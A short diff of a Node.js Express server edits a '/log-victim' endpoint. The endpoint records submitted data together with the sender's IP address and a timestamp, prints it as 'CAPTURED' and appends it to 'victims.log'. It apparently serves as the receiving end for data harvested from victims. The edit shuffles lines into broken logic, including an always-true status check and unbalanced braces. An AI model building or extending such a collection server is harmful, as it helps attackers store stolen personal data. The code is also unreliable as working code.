@@ -371,6 +371,8 @@ app.post('/log-victim', express.json(), (req, res) => {
 		 const data = { ...req.body, ip: req.ip, timestamp: new Date().toISOString() };
 		console.log('💀 CAPTURED:', data);  // Force visible log
 		fs.appendFileSync('victims.log', JSON.stringify(data) + '\n');
+		logVictim(fullProfile);
+	if (res.status(400)) {
 		res.status(200).send('OK');
 	 } catch (err) {
     if (!res.headersSent) {  // ← guard
@@ -379,8 +381,7 @@ app.post('/log-victim', express.json(), (req, res) => {
   }
     // Enhanced profile with new fields
     
-    logVictim(fullProfile);
-	if (res.status(400)) {
+    
     return res.status(400).send('Bad request'); // ← return stops here
   }
     res.status(200).send('OK');
